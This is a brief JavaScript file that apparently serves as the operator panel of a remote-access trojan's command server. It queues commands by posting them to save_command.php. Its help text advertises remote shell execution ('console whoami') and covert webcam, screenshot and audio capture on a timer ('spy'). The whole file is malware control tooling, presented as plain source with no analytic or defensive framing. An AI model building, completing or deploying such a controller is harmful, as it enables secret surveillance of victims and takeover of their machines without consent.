document.getElementById('commandForm').onsubmit = function(event) {
    event.preventDefault();

    var command = document.getElementById('commandInput').value;
    var outputDiv = document.getElementById('output');

    if (command.toLowerCase() === 'help') {
        outputDiv.innerHTML = '-help - list of all command <br>-null - do nothing <br>-console {commant to execute} (console whoami) <br>-spy {interfall in seconds} (spy 5)- webcam/screenshot + audio recording on interfall <br>-setinter {seconds}';
    } else {
        var xhr = new XMLHttpRequest();

        xhr.open('POST', 'save_command.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    outputDiv.innerHTML = 'Command saved!';
                } else {
                    outputDiv.innerHTML = 'Failed to save command. Error: ' + xhr.responseText;
                }
            }
        };

        xhr.send('command=' + encodeURIComponent(command));
    }
};
